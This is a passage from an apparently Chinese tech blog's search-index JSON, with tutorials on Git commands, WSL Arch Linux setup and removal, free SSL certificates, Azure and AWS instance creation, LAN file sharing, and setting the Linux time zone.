-p master..origin&#x2F;master$ git merge origin&#x2F;master 另一种写法就是： 123$ git fetch origin master:tem$ git diff tem$ git merge tem 上面这两种写法都是都是一个意思。唯一有所区别的就是使用 tem分支代替了origin/master分支的存在。其含义是： 从远程origin主机的master主分支下载最新的版本到本地origin/master分支，或者tem分支。 比较本地master分支与origin/master（tem）分支的差异。 最后进行合并 git pull，相当于从远程获取最新的版本并合并到本地。 1$ git pull origin master 上述命令其实相当于git fetch 和 git merge在实际使用中，git fetch更安全一些，因为在merge前，我们可以查看更新情况，然后再决定是否合并。","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Win10 如何卸载 Arch Linux","slug":"how-to-uninstall-wsl-linux-subsystem-in-win-10","date":"2020-08-16T09:56:22.000Z","updated":"2020-08-23T02:46:19.997Z","comments":true,"path":"how-to-uninstall-wsl-linux-subsystem-in-win-10/","link":"","permalink":"https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/","excerpt":"最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。","text":"最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。 在正式卸载之前，有以下几点需要注意： 不要试图通过 Microsoft Store 去卸载，那里只有安装按钮，没有卸载按钮。 秋季创意者更新之前，可以使用lxrun命令去进行卸载操作，但是秋季创意者更新之后该命令就被移除了。 查看发行版列出当前已经安装且随时可用的发行版： 1wslconfig &#x2F;list 列出所有发行版，包括正在安装、卸载和已损坏的发行版： 1wslconfig &#x2F;list &#x2F;all 卸载卸载已经安装的发行版： 12345$ wslconfig &#x2F;list &#x2F;allWindows Subsystem for Linux Distributions:Arch (Default)$ wslconfig &#x2F;unregister ArchUnregistering... 上面是以Arch Linux为例进行卸载，其他发行版同理，只需要替换发行版的名称就可以了。 注意: 卸载发行版时，会永久删除所有与该发行版有关的数据和设置。 参考链接 Windows 10 Linux子系统如何卸载？","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"Win10 如何安装 Arch Linux","slug":"how-to-install-arch-linux-on-win10","date":"2020-08-16T09:50:09.000Z","updated":"2020-08-16T10:00:10.873Z","comments":true,"path":"how-to-install-arch-linux-on-win10/","link":"","permalink":"https://www.0x2beace.com/how-to-install-arch-linux-on-win10/","excerpt":"最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。 第一件需要做的事情就是配置开发环境。","text":"最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。 第一件需要做的事情就是配置开发环境。 了解 WSL什么是 WSL ？Windows Linux Server (WSL) 又名Windows 子系统，它使得开发人员可以直接在未经修改得Windows 上运行 Gun/Linux 环境，也包括大多数命令行工具，实用程序员和应用程序员，而不会需要额外增加虚拟机。 WSL 可以做什么 你可以自行选择你喜欢的 Gun/Linux 发行版：Arch Linux、Ubuntu、OpenSuSE、Kail Linux、Debian、Fedora等。 运行通用的命令行，例如grep，sed，awk或其他ELF-64二进制文件。 轻松运行Bash Shell脚本和 GNU/Linux 命令行应用程序 使用自己的 GNU/Linux 分发程序包管理器安装其他软件。 使用类似Unix的命令行外壳调用Windows应用程序。 在Windows上调用 GNU/Linux 应用程序。 有了这些功能，我们就可以完成很多工作，而不必担心安装虚拟机监控程序，从而享受Linux的好处。安装并准备好Win 10后，请按照以下步骤进行操作，并在其中添加Arch Linux。 安装 WSL本文要安装的WSL 是 Arch Linux 。 为什么要选择 Arch Linux？ 因为它是一个轻量级且灵活的Linux 发行版。 为Linux 安装Windows 子系统这是一项使Windows能够“ 托管 ” Linux 的功能。所以需要先启用此功能。 以管理员的身份打开Power Shell，然后输入以下命令： 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 通常会重启一次你的电脑。 安装Arch Linux我记得在2019 年，Windows 刚拥抱 Linux 时，Arch Linux 还可以直接从 Microsoft Store 直接下载，不知为何现在却搜不到了。 不过还是有其他办法手动安装，打开该页面，下载Arch.zip。 解压完成之后，可以看到如下文件： 双击Arch.exe应用程序，进行安装。 稍微等待一会，就可以看到Arch Linux 已经顺利安装完成了，然后按任意键退出。 启动Arch Linux再次双击Arch Linux，不出意外的话，就可以看到Arch Linux 的控制台了，没错就是这么简单。 配置第一次安装完成之后，需要手动做一些配置，初始化并更新系统。 在终端或CMD 中输入WSL 进入Arch Linux。 编辑 /etc/pacman.d/mirrorlist，去掉China节点 前面的##，以及下面的Server下面的##。 初始化123pacman-key --initpacman-key --populate archlinux 更新12345&#x2F;&#x2F; 更新 GPG keypacman -Sy archlinux-keyring&#x2F;&#x2F; 更新系统，速度快慢与镜像源有关pacman -Syyu base base-devel 个性化Arch Linux 默认的样式并不好看，和CMD 都是黑漆漆的一片。 因为Arch Linux 默认使用的 Bash，如果你和我一样，更喜欢 Zsh 的话，那就请继续看下去。 安装ZSH既然要安装Zsh，那就不得不安装oh-my-zsh了，所以这里一起安装了。 1pacman -S zsh oh-my-zsh-git 安装Spaceship ZSHSpaceship ZSH 是Zsh 的提示符工具。 克隆仓库 1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; 链接文件 1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; 更改默认theme 12# vim ~&#x2F;.zshrcZSH_THEME&#x3D;&quot;spaceship&quot; 重启终端即可。 参考链接 安装ArchWSL（Windows 下的Arch Linux 子系统）","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"如何申请免费的SSL 证书","slug":"how-to-apply-for-a-free-ssl-certificate","date":"2020-08-14T10:03:13.000Z","updated":"2020-12-21T03:43:39.608Z","comments":true,"path":"how-to-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/","excerpt":"这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。","text":"这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。 准备像这类提供免费 SSL 证书的网站非常多，这里我选择的平台是 FreeSSL.cn 。 在正式开始之前，你得准备一个邮箱，注册 一个 FreeSSL.cn 账号，然后登录。 将需要申请证书的域名填写在输入框中，选择多域名通配符，然后点击创建免费的SSL 证书。 我这里选择的是泛域名，根据你自己的实际情况，去创建相应子域名的证书： example.com：主域名 *.example.com：泛域名 选择浏览器生成。 点击确认创建。 添加TXT 记录打开需要申请 SSL 证书的域名管理后台，找到 DNS 管理。 添加 TXT 验证，将刚才的记录值与TXT 记录添加到对应的TXT 类型。 注意⚠️：记录值区分大小写。 检测是否配置成功。 在完成验证之前不要离开当前页面，验证成功之后，点击验证。 如果配置成功没问题，就可以点击验证，下载证书就完成了。 注意⚠️：使用此方式获取的证书，有效期只有三个月。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"手把手教你如何创建启动 Azure 实例","slug":"teach-you-how-to-create-and-start-an-azure-instance","date":"2020-08-12T15:49:19.000Z","updated":"2020-08-27T06:26:47.806Z","comments":true,"path":"teach-you-how-to-create-and-start-an-azure-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/","excerpt":"这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。 一是方便自己以后回顾，二是给其他人作为参考。","text":"这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。 一是方便自己以后回顾，二是给其他人作为参考。 准备因为本文是创建微软云，所以首先你得有一个微软账号。 打开 Microsoft Azure 进行登录，登录成功之后，进入云服务管理后台。 创建实例点击创建资源。 可以搜索你想创建的云服务类型，这里我选择的是 Ubuntu Server 18.04 LTS。 点击创建。 放心，这里的创建并不是正真意义上的创建。接下来需要为机器预设配置。 下面对常见的配置进行简单说明： 资源组：用来分配一些权限以及策略。 虚拟机名称：你希望用什么名称来称呼这台机器（通常是英文） 区域：选择机器所在地区 映像：选择操作系统 大小：选择一个合适的负责类型，可以理解成机器的硬件配置。 身份验证类型：通常有两种：ssh 密钥和密码，强烈建议使用密钥而不使用密码（密哦存在被暴力破解的风险）。 用户名：微软云默认没有给root 用户，这里需要指定用户名称。 公共入站端口：通常是只开启HTTP (80)、HTTPS (443)、SSH (22) 。 完成基本配置之后，点击下一步：磁盘。 Azure 默认只有一个用于短期存储的临时盘，而临时盘通常都很小。 默认的磁盘很小，如果想扩大有两种方式： 创建新的磁盘，需要手动挂载。 更改默认磁盘的大小。 配置完磁盘之后，点击下一步：网络。 网络配置，公用ip 可以选择无，后面再去新建。 然后点击下一步：管理。 管理、高级、标记这一块，如果没有特殊需求可以直接使用默认配置。 最后点击查看+创建，可以看到预设的配置信息，如果符合预期，点击创建。 下载私钥并保存好。 此时，虽然已经创建好虚拟机，但是还不能直接使用，因为没有配置IP。 关联IPAzure 和 AWS 不同，它并没有弹性IP 的概念，如果需要配置IP，需要在搜索栏中搜索公共IP地址， 点击第一个搜索结果。 点击添加。 配置IP 基本信息，然后点击创建。 此时，只是创建了内网IP，并没有与外网IP 地址进行关联， 点击刚才新建的公共 IP 地址，点击配置。 资源类型选择网络接口，网络接口与对应的实例进行关联。 关联成功之后，就可以进行连接了。 连接 打开终端 请确保你对私钥具有只读访问权限。 1chmod 400 &lt;私钥&gt; 运行以下示例命令以连接到 VM。 1ssh -i &lt;私钥路径&gt; user@ip_address user：表示VM 用户 ip_address：表示外网IP 地址 扩大默认磁盘大小上面简单提到过，如果想要扩大默认磁盘的大小，有两种方式： 添加新磁盘。这种方式需要手动挂载，如果对linux 并不熟悉，这种方式不推荐新手用户使用。 更改默认磁盘大小。 第二种方式并不能直接更改，需要先将服务器停掉（注意⚠️：不是删除）。 搜索磁盘，点击第一个搜索结果。 点击需要扩大的磁盘实例，注意：只能扩大，不能缩小。 然后点击保存即可。 总结至此，就已经完成了Azure 的创建了，这方面需要学习的还有很多，这里只是简单的整理了一下自己遇到的问题。 有些地方可能没说清楚，但如果能帮到你那真是太好了","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"Windows 和 Mac 在局域网内如何共享文件？","slug":"how-do-windows-and-mac-share-files-in-the-local-area-network","date":"2020-08-11T14:11:18.000Z","updated":"2020-08-13T11:43:07.419Z","comments":true,"path":"how-do-windows-and-mac-share-files-in-the-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/","excerpt":"每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。如果碰到了大一点的文件，就得换成网盘或者移动硬盘。 身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。","text":"每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。如果碰到了大一点的文件，就得换成网盘或者移动硬盘。 身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。 准备这里准备的是用 Windows 作为主机创建共享文件。 首先要确认准备传输文件的 Windows 和 Mac 是在同一个路由器组成的局域网内。 然后打开 Windows 的文件资源管理器，在其根目录下创建一个共享文件夹，名称随意，自己知道就好了。 右键文件夹，点击属性，找到 共享 Tab，点击高级共享。 勾选共享此文件夹，点击确定。 然后回到共享文件夹，右键点击属性，找到共享，选择用户。 如果允许其他人写入，则选择 Everyone，更改为：读取/写入。 访问Windows 本机访问123# ComputerName 表示：你的计算机名称# ShareFolders 表示：共享文件夹名称file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F; Mac 局域网访问Mac 有两种方式： 通过浏览器访问 通过访达访问，使用快捷键 ⌘ + k123# ComputerName 表示：需要访问的计算机名称# ShareFolders 表示：共享文件夹名称smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F; 通过验证之后，就能访问到共享文件夹了。 到这里应该就能顺利的在两个或多个电脑之间传输文件了。 如果还不能访问，可以ping 一下对方的主机，如果没有ping通，检查一下防火墙设置。 如果防火墙关着，那么会 ping 不通。 参考链接 Windows 和 Mac 在局域网内如何共享文件？ 共享文件夹 一个实现Windows和Mac之间文件互传的简单方法","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Git 常用命令参考手册","slug":"git-common-command-reference-manual","date":"2020-08-11T01:22:19.000Z","updated":"2020-08-11T01:24:32.528Z","comments":true,"path":"git-common-command-reference-manual/","link":"","permalink":"https://www.0x2beace.com/git-common-command-reference-manual/","excerpt":"虽然每天都在使用Git，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些Git 常用命令。","text":"虽然每天都在使用Git，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些Git 常用命令。 基础配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 1234567891011121314151617181920# 查看全局配置列表$ git config --global --list# 查看局部配置列表$ git config --local --list# 设置全局用户名&#x2F;邮箱$ git config --global user.name &quot;yourName&quot;$ git config --global user.email &quot;example@example.com&quot;# 设置本地当前工作区仓库用户名&#x2F;邮箱$ git config --local user.name &quot;yourName&quot;$ git config --local user.email &quot;example@example.com&quot;# 将默认文本编辑器设置为 emacs&#x2F;vim$ git config --global core.editor emacs&#x2F;vim# 编辑当前仓库的配置文件$ git config -e # 等价与 vim .git&#x2F;config# 编辑全局配置文件$ git config --global -e 命令别名配置12345678# 添加别名 git st &#x3D; git status$ git config --global alias.st status# 删除 st 别名$ git config --global --unset alias.st# 执行外部命令, 只要在前面加 ! 即可$ git config --global alias.st &#39;!echo hello&#39;; 代理配置如果想知道关于Git配置代理的更多信息，可以查阅这篇笔记。 1234567891011# 配置HTTP&#x2F;HTTPS 代理$ git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087# 查看$ git config --global --get http.proxy$ git config --global --get https.proxy# 取消代理$ git config --global --unset http.proxy$ git config --global --unset https.proxy 生成SSHKey关于如何配置ssh config 可以查阅这篇笔记。 12345# 将ssh key生成在默认下，也就是&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;。$ ssh-keygen -t rsa -C &quot;youremail&quot;# 将ssh key生成在指定路径下的指定文件名中$ ssh-keygen -t rsa -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot; 准备工作1234567891011# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] [project-name]# 浅克隆, 历史记录只克隆最后一条, 减少克隆时间$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git 基础操作基础操作中的命令都是日常使用频率非常高的。 文件状态12345678# 查看工作区状态$ git status# 列出没有被 .gitignore 忽略的文件列表$ git status --ignored# 列出没有被 .gitignore 忽略的文件列表$ git ls-files 文件操作1234567891011121314151617181920# 暂存所有$ git add -A# 暂存某个文件$ git add .&#x2F;README.md# 添加当前目录的所有文件到暂存区 $ git add .# 暂存一系列文件$ git add 1.txt 2.txt ...# 从暂存区中删除文件（git add 的反向操作）$ git rm [file] # 暂存区、工作区一起删除$ git rm -f [file]# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file] 查看文件改动123456789101112131415# 查看所有文件改动$ git diff# 查看具体文件的改动$ git diff README.md# 查看指定 commit-id 改动内容$ git diff [commit-id]# 对比工作区和版本库里的最新版本有什么区别$ git diff HEAD --[file-name]# 查看某个文件的历史修改记录$ git log README.md$ git show [commit-id] README.md 撤销与回滚1234567891011121314151617# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 回滚上一个版本$ git reset --hard HEAD^# 回退到指定版本（会重置暂存区与工作区）$ git reset --hard [commit-id]# 回退到指定版本（不会重置暂存区与工作区，会回到该版本的暂存状态）$ git reset --soft [commit-id] 提交123456789101112# 提交暂存区到本地仓库$ git commit -m [message]# 提交暂存区的指定文件到本地仓库git commit README.md -m [message]# 提交并显示diff变化git commit -v# 重写上一次的提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message] 日志1234567891011121314151617181920# 查看完整历史提交记录$ git log# 查看前n 条记录$ git log -n# 以图形方式查看完整历史提交记录$ git log --graph --pretty&#x3D;oneline --abbrev-commit# 通过commit log 进行搜索$ git log -i --grep&#x3D;&quot;fire bug&quot;# 列出提交者贡献数量, 只会打印作者和贡献数量$ git shortlog -sn# 以提交贡献数量排序并打印出信息$ git shortlog -n# 采用邮箱格式化的方式进行查看贡献度$ git shortlog -e 分支123456789101112131415161718192021222324252627282930313233343536373839404142434445# 查看本地分支git branch# 查看所有分支git branch -a# 查看本地分支所关联的远程分支git branch -vv# 查看本地 master 分支创建时间git reflog show --date&#x3D;iso master# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit-id]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit-id]# 删除指定分支$ git branch -d [branch-name]# 强制删除指定分支$ git branch -D [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote&#x2F;branch] 远程仓库管理1234567891011121314151617# 查看远程仓库（默认是origin，这是git 会使用的默认名称）$ git remote # 指定-v, 查看所有远程仓库地址$ git remote -v# 添加一个新的远程仓库$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git# 查看指定远程仓库的详情信息$ git remote show [origin-name]# 重命名远程仓库$ git remote rename [old-name] [new-name]# 移除远程仓库$ git remote remove [origin-name] Push1234567891011# 默认推送当前分支$ git push# 推送内容到主分支，并建立追踪关系$ git push -u origin master# 将本地分支推送到指定远程分支， （本地分支:远程分支）$ git push origin [branch]:[branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push -f Pull1234567891011# 取回默认远程仓库的变化，并自动与本地分支合并$ git pull# 取回指定远程仓库的变化，并自动与本地指定分支合并（远程分支名:本地分支名）$ git pull [remote] [branch]:[branch]# 取回指定远程仓库的变化，并自动与本地当前分支合并$ git pull origin master# 取回远程仓库的所有变动，但是不会自动与本地当前分支合并$ git fetch 进阶操作进阶操作中的命令是一些很实用，但可能不常使用，所以把它们单独拎出来。 cherry-pick12345# 选择一个commit，合并进当前分支$ git cherry-pick [commit-id]# 保留原有作者信息进行提交$ git cherry-pick -x [commit-id] Stash1234567891011# 将当前的工作区隐藏$ git stash# 恢复隐藏的工作区，并将此次隐藏记录从隐藏列表中移出$ git stash pop# 恢复隐藏的工作区，保留此次隐藏记录$ git stash apply# 查看当前隐藏列表$ git stash list Blamegit blame 用于查看某个文件的修改历史记录是哪个作者进行了改动。 12345678# 查看 README.md 文件的修改历史记录，包括时间、作者以及内容$ git blame README.md# 查看谁改动了 README.md 文件的 11行-12行$ git blame -L 11,12 README.md# 查看谁改动了 README.md 文件11行以后$ git blame -L 11 README.md 标签1234567891011121314151617181920212223242526272829303132# 列出本地所有标签git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs&#x2F;tags&#x2F;[tagName]# 列出远程所有标签$ git ls-remote --tags origin# 创建带有附注标签$ git tag -a v1.1.0 -m &quot;标签描述&quot;# 查看本地tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] Git ProTipsGit ProTips 则是整理的一些Git 的奇技淫巧。 12345678910# 通过使用别名，优化 git log 输出，这里另外提供几种模式, 可以选择喜欢的一种进行别名配置$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot; 参考链接 Git 常用命令整理 常用Git 命令清单","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"手把手教你如何创建启动 AWS 实例","slug":"teach-you-how-to-start-an-aws-instance","date":"2020-08-10T06:05:17.000Z","updated":"2020-08-27T06:26:53.546Z","comments":true,"path":"teach-you-how-to-start-an-aws-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/","excerpt":"什么是AWS ？ Amazon Web Services (AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。","text":"什么是AWS ？ Amazon Web Services (AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。 云这个概念最开始是从国内的阿里云、腾讯云这些地方听到的，后来服务器接触的多了，也慢慢了解了一些国外的云，如：亚马逊云、微软云。 在亚马逊云、软微云上创建一台实例其实是非常简单的事情，但由于这方面资料比较少，导致对于新用户可能不那么友好，我自己当初创建时就不怎么顺利。所以整理这篇笔记的目的有两个，一是方便自己日后回顾，二是给第一次使用的用户一些参考。 启动实例首先登入到AWS ，找到EC2 并点击 在左侧菜单栏中点击实例 点击启动实例 配置实例选择系统映像，这里以Linux 操作系统为例，我选择是Ubuntu Server 18.04 LTS，这个版本表示Ubuntu 服务端 长期稳定支持版本。 选择实例类型，根据自身需要考虑，当然 性能越好价格越高。这里我选择的是一个中等偏下的类型。 配置实例详情信息，这里的这些核心配置，通常都保持默认，只是将自动分配公有IP 地址改为禁用。这样再重启机器时，就不会改变IP了。 根据自身需要分配合适的硬盘大小。 配置安全组，所谓安全组就是拥有相同防火墙规则的群组。这个也是根据自身需要选择是否共用同一个安全组。 拥有同一个安全组就表示拥有相同的防火墙规则。设置完安全组之后，点击审核和启动。 下面会有一个界面给你确认机器的配置是否无误的，从头到尾检查没有问题之后就可以点击启动实例了。 创建密钥可以选择共用已有的密钥对也可以选择新建一个。 然后点击启动实例。 分配弹性IP启动完成之后点击查看实例。 在实例列表中，找到该实例之后，分别点击操作=&gt;联网=&gt;管理IP 地址=&gt;分配弹性 IP 确认分配 分配成功之后，会得到一个弹性IP（公有），然后返回实例列表 关联IP 地址找到刚才启动的那个实例（没有实例ID），分别点击操作=&gt;关联地址 这一步很重要，这里要将实例和弹性IP 地址关联，所以要选择该弹性IP 对应自己的实例。如果不确定是哪一个，可以返回到实例列表中去查看，就是那个没有名称的实例。 然后点击关联 关联成功 直到做完这一步才算正真的启动好一个实例。 连接启动好实例之后，如何连接呢？ 1$ ssh -i &lt;私钥路径&gt; ubuntu@ipaddress 指定刚才生成的密钥对，使用ssh命令 即可连接。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"如何修改 Linux 默认时区","slug":"how-to-modify-the-linux-default-time-zone","date":"2020-08-09T13:23:30.000Z","updated":"2020-08-22T00:44:06.247Z","comments":true,"path":"how-to-modify-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/","excerpt":"在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。","text":"在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。 在Linux 服务器或系统上保持正确的时间始终是一个好习惯，它可能具有以下优点： 由于Linux 中的大多数任务都是按时间控制的，因此可以保持系统任务的及时运行。 在系统上记录事件和其他信息的正确时间等等。 在Linux 中设置时区，有几种方式。 0x1. 使用tzselete 命令 使用tzselete 命令选择所在时区。 将时区所在的配置文件TZ=&#39;Asia/Shanghai&#39;; export TZ 添加到~/.profile文件。 使用source ~/.profire命令，使时区设置生效。 0x2. 使用timedatectl 命令Ubuntu 系统提供了timedatectl 命令，非常方便的供我们查看设置Linux 系统时区。 1$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot; 如果你忘记了你想要的时区叫什么名字，那么可以使用下面的命令查看所有可用时区： 1$ timedatectl list-timezones 因为 Linux 的时间分为两种： 硬件时间：由 BIOS（或CMOS）所负责。 系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。 0x3. 设置硬件时间12$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtimelrwxrwxrwx 1 root root 27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC 可以看到默认链接的是UTC，所以需要手动更改链接时区文件。 1$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime 查看硬件时间 1$ hwclock -r 将系统时间改为硬件时间 1$ hwclock --hctosys 需要想清楚的是，时间戳本身是永远不变的，无论在哪个时区同一时刻所生成的时间戳一定是一样的。 会发生变化的只有时区，而时间戳则是根据时区的不同而解析出来的时间不同。 参考链接 How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command Linux 查看设置系统时区 Linux 时间以及时区","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql 